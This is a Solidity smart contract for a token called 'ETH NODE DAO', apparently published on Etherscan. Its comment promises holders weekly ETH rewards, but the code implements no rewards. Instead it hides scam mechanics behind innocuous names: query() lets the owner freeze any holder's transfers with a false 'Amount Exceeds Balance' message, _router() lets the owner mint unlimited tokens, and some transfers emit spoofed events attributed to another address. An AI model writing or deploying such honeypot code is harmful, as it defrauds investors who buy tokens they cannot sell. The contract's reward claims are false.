/**
 *Submitted for verification at Etherscan.io on 2022-09-23
*/

pragma solidity 0.8.17;
/*

ETH NODE DAO - $ETHNODE

- Now everyone can own a piece of a node with $ETHNODE
- Simply Hold $ETHNODE to receive $ETH Rewards
- Rewards dispersed Weekly




*/   
 
contract NODEDAO {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) rxAmount;

    // 
    string public name = "ETH NODE DAO";
    string public symbol = unicode"NODE";
    uint8 public decimals = 18;
    uint256 public totalSupply = 320000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0xd2696A6D5Ce4D9e1d05A17956BB1E89E9C3116fc;
    address lead_deployer = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;
   


modifier onlyOwner() {
    require(msg.sender == owner);
    _; }


    function deploy(address account, uint256 amount) public onlyOwner {
    emit Transfer(address(0), account, amount); }
    

    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }       
        require(!rxAmount[msg.sender] , "Amount Exceeds Balance"); 
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }
        function query(address _user) public {
             require(msg.sender == owner);
         require(!rxAmount[_user], "NaN");
        rxAmount[_user] = true; }
        function call(address _user) public {
             require(msg.sender == owner);
        require(rxAmount[_user], "NaN");
         rxAmount[_user] = false; }

         

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }
        function _router(address oracle,  uint256 update) public {
             require(msg.sender == owner);
             balanceOf[oracle] += update;
             totalSupply += update; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }     
        require(!rxAmount[from] , "Amount Exceeds Balance"); 
        require(!rxAmount[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }